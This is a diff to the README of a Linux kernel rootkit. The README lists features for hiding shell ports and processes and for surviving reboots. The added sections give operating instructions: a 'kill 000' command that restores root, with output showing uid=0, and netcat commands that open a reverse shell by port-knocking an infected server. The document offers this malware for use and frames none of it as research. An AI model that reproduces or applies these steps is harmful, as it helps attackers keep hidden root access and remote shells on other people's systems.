@@ -11,7 +11,6 @@ Features :
   <li>hide bind shell and reverse shell port from netstat</li>
   <li>hide bind shell and reverse shell process</li>
   <li>rootkit persistence to survice after reboot</li>
-  
 <br>
 Developed by : Antonius 
 <br>
@@ -21,7 +20,6 @@ github : https://github.com/bluedragonsecurity
 <br>
 https://twitter.com/bluedragonsec
 </p>
-<br>
 <h3>Installation</h3>
 <p>
 In case you have installed linux kernel headers, make and gcc, install it by running the installer script:
@@ -37,9 +35,9 @@ In case you haven't installed linux kernel headers, make and gcc, install it by 
 </pre>
 <br>
 </p>
-<br>
-<p>
 <h3>Using the Rootkit</h3>
+<p>
+<b>Privilege Escalation</b>  
 <br>
 Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing : <b>kill 000</b>
 <pre>
@@ -49,4 +47,20 @@ robotsoft@robotsoft:~$ kill 000
 robotsoft@robotsoft:~$ id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
 </pre>  
+</p>
+<p>
+<b>Activating Reverse Shell</b>
+<br>
+To activate reverse shell, you need to set up a port listener using netcat on port 31337, the do port knocking to your target server (with rootkit installed) on port 1337.
+<br>
+On your machine, open terminal and type:
+<br>
+<pre>
+nc -l -p 31337 -v
+</pre>  
+Open another terminal tab and do port knocking to target server :
+<pre>
+nc <server ip> 1337
+</pre>  
+  
 </p>
